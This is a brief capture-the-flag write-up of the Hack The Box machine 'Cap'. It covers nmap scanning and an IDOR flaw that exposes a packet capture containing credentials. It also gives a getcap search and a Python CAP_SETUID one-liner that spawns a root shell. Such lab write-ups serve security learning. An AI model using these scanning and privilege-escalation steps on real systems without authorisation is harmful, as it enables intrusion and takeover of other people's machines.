---
layout: single
title: Cap - Hack The Box
excerpt: "Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. "
date: 2025-05-10
classes: wide
header:
  teaser: /img2/cap.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Insecure Directory Object Reference (IDOR)
  - Information Leakage
  - Abusing Capabilities (Python3.8) [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.245
```

![](/img2/Pasted%20image%2020250510161529.png)

- Vulnerability and version scan

```bash
nmap -sCV -p21,22,80 -vvv 10.10.10.245 
```

![](/img2/Pasted%20image%2020250510161744.png)

## Exploitation

- IDOR 

![](/img2/Pasted%20image%2020250510163241.png)

![](/img2/Pasted%20image%2020250510163341.png)

```bash
ssh nathan@10.10.10.245
```

## Post-exploitation

- Capabilities

```bash
getcap -r / 2>/dev/null
```

![](/img2/Pasted%20image%2020250510164146.png)

- Python3.8 CAP_SETUID

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

![](/img2/Pasted%20image%2020250510164405.png)